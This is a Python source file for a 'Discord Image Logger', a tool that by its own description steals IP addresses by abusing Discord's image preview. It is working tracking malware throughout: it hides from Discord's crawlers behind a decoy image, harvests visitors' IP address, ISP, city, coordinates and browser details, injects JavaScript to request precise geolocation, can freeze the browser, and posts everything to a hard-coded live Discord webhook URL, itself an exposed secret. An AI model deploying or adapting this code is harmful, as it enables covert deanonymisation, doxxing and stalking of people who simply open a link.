# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1334261539993026560/oeumT-kc65a5lIgTcszduF2UPcd75DmWYPYeU1cI-sIbds00EwM13uHeZjAfyMKHoGgZ",
    "image": "https://www.meme-arsenal.com/memes/8e63547a83c1f0d7dccb3f6596e668ca.jpg",  # Default image URL
    "imageArgument": True,  # Allow custom image URL via a URL argument (base64 encoded)

    # CUSTOMIZATION #
    "username": "Image Logger",  # Webhook username
    "color": 0x00FFFF,  # Hex color for embed (e.g., 0xFF0000 for red)

    # OPTIONS #
    "crashBrowser": False,  # Attempt to crash/freeze the browser (may not work on all clients)
    "accurateLocation": True,  # Uses browser geolocation (asks the user)
    "message": {  # Custom message settings when the image is loaded
        "doMessage": False,  # Show a custom message instead of the image?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,  # Enable token replacement in the custom message
    },
    "vpnCheck": 1,  # VPN/Proxy handling: 0 = no check; 1 = disable ping; 2 = do not alert if VPN detected
    "linkAlerts": True,  # Alert when someone sends the link
    "buggedImage": True,  # Send a loading image to Discord crawlers
    "antiBot": 1,  # Anti-bot handling: 0 = no check; 1 = disable ping; 2 = disable ping if data center; 3 = do not alert; 4 = do not alert if data center

    # REDIRECTION #
    "redirect": {
        "redirect": False,  # Redirect to another webpage after logging?
        "page": "https://your-link.here"  # URL to redirect to
    },
}

# Blacklisted IP prefixes (to ignore certain IP blocks)
blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    """
    Improved bot detection by checking the user agent for known keywords.
    Returns a string identifier for the bot if detected, otherwise False.
    """
    ua = useragent.lower() if useragent else ""
    # Check for known bot user agents
    if "discord" in ua:
        return "Discord"
    elif "telegrambot" in ua:
        return "Telegram"
    # Check for generic bot keywords (these can be adjusted as needed)
    elif any(keyword in ua for keyword in ["bot", "crawl", "spider", "slurp", "mediapartners"]):
        return "Generic Bot"
    return False

def reportError(error):
    """Report any errors to the configured Discord webhook."""
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n\n{error}\n",
            }
        ],
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    """
    Build and send an embed with information about the IP that accessed the image.
    This function includes improved VPN and bot checks.
    """
    # Ignore IPs from blacklisted ranges
    if ip.startswith(blacklistedIPs):
        return

    # First, check for bots via user agent (or IP, if desired)
    bot_type = botCheck(ip, useragent)
    if bot_type:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [
                    {
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": (
                            f"An **Image Logging** link was sent in a chat!\n"
                            f"You may receive an IP soon.\n\n"
                            f"**Endpoint:** {endpoint}\n"
                            f"**IP:** {ip}\n"
                            f"**Platform:** {bot_type}"
                        ),
                    }
                ],
            })
        return

    # Retrieve IP details from ip-api
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()

    # Determine if VPN/Proxy or data center (hosting) is suspected
    vpn_suspected = info.get("proxy", False)
    hosting_suspected = info.get("hosting", False)

    # Determine whether to ping @everyone based on configuration
    ping = "@everyone"
    if vpn_suspected:
        if config["vpnCheck"] == 2:
            return  # Do not alert if VPN/proxy is detected
        elif config["vpnCheck"] == 1:
            ping = ""  # Do not ping if VPN detected
    if hosting_suspected:
        if config["antiBot"] in (3, 4):
            return  # Do not alert if data center/hosting is detected
        elif config["antiBot"] in (1, 2):
            ping = ""

    # Get OS and browser info from the user agent
    os_name, browser = httpagentparser.simple_detect(useragent)

    # Build a cleaner embed with fields
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": "A user opened the original image!",
                "fields": [
                    {
                        "name": "Endpoint",
                        "value": endpoint,
                        "inline": False
                    },
                    {
                        "name": "IP Information",
                        "value": (
                            f"**IP:** {ip if ip else 'Unknown'}\n"
                            f"**Provider:** {info.get('isp', 'Unknown')}\n"
                            f"**ASN:** {info.get('as', 'Unknown')}\n"
                            f"**Country:** {info.get('country', 'Unknown')}\n"
                            f"**Region:** {info.get('regionName', 'Unknown')}\n"
                            f"**City:** {info.get('city', 'Unknown')}\n"
                            f"**Coords:** {str(info.get('lat'))+', '+str(info.get('lon')) if not coords else coords.replace(',', ', ')} "
                            f"{'(Approximate)' if not coords else '(Precise)'}\n"
                            f"**Timezone:** {info.get('timezone', 'Unknown')}\n"
                            f"**Mobile:** {info.get('mobile', 'Unknown')}\n"
                            f"**VPN/Proxy:** {vpn_suspected}\n"
                            f"**Hosting:** {hosting_suspected}"
                        ),
                        "inline": False
                    },
                    {
                        "name": "PC Information",
                        "value": f"**OS:** {os_name}\n**Browser:** {browser}",
                        "inline": False
                    },
                    {
                        "name": "User Agent",
                        "value": useragent,
                        "inline": False
                    }
                ],
                "footer": {
                    "text": "Logged by Discord Image Logger"
                }
            }
        ]
    }

    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}

    requests.post(config["webhook"], json=embed)
    return info

binaries = {
    "loading": base64.b85decode(
        b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'
    )
    # This is a loading image (not malicious) served to Discord crawlers.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):

    def handleRequest(self):
        try:
            # Determine which image URL to use (via URL argument or default)
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    # Decode the URL argument (supports both "url" and "id")
                    url = base64.b64decode((dic.get("url") or dic.get("id")).encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            # HTML/CSS to show the image
            data = f'''<style>body {{
    margin: 0;
    padding: 0;
}}
div.img {{
    background-image: url('{url}');
    background-position: center center;
    background-repeat: no-repeat;
    background-size: contain;
    width: 100vw;
    height: 100vh;
}}</style><div class="img"></div>'''.encode()

            forwarded_ip = self.headers.get('x-forwarded-for', '')
            if forwarded_ip.startswith(blacklistedIPs):
                return

            # If the request is suspected as a bot, serve the bugged image and report a minimal alert.
            if botCheck(forwarded_ip, self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location',
                                 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()
                if config["buggedImage"]:
                    self.wfile.write(binaries["loading"])
                makeReport(forwarded_ip, endpoint=self.path.split("?")[0], url=url)
                return
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(forwarded_ip,
                                        self.headers.get('user-agent'),
                                        location,
                                        s.split("?")[0],
                                        url=url)
                else:
                    result = makeReport(forwarded_ip,
                                        self.headers.get('user-agent'),
                                        endpoint=s.split("?")[0],
                                        url=url)

                message = config["message"]["message"]
                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", forwarded_ip)
                    message = message.replace("{isp}", result.get("isp", "Unknown"))
                    message = message.replace("{asn}", result.get("as", "Unknown"))
                    message = message.replace("{country}", result.get("country", "Unknown"))
                    message = message.replace("{region}", result.get("regionName", "Unknown"))
                    message = message.replace("{city}", result.get("city", "Unknown"))
                    message = message.replace("{lat}", str(result.get("lat", "Unknown")))
                    message = message.replace("{long}", str(result.get("lon", "Unknown")))
                    if "timezone" in result:
                        tz_parts = result["timezone"].split('/')
                        tz = f"{tz_parts[1].replace('_', ' ')} ({tz_parts[0]})" if len(tz_parts) > 1 else result["timezone"]
                    else:
                        tz = "Unknown"
                    message = message.replace("{timezone}", tz)
                    message = message.replace("{mobile}", str(result.get("mobile", "Unknown")))
                    message = message.replace("{vpn}", str(result.get("proxy", "Unknown")))
                    message = message.replace("{bot}", str(result.get("hosting", "Unknown") if result.get("hosting") and not result.get("proxy") else ('Possibly' if result.get("hosting") else 'False')))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'
                if config["message"]["doMessage"]:
                    data = message.encode()
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()

                self.send_response(200)
                self.send_header('Content-type', datatype)
                self.end_headers()

                # If accurateLocation is enabled, add JavaScript to attempt to retrieve geolocation data
                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
            if (currenturl.includes("?")) {
                currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            } else {
                currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            }
            location.replace(currenturl);
        });
    }
}
</script>"""
                self.wfile.write(data)

        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return

    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
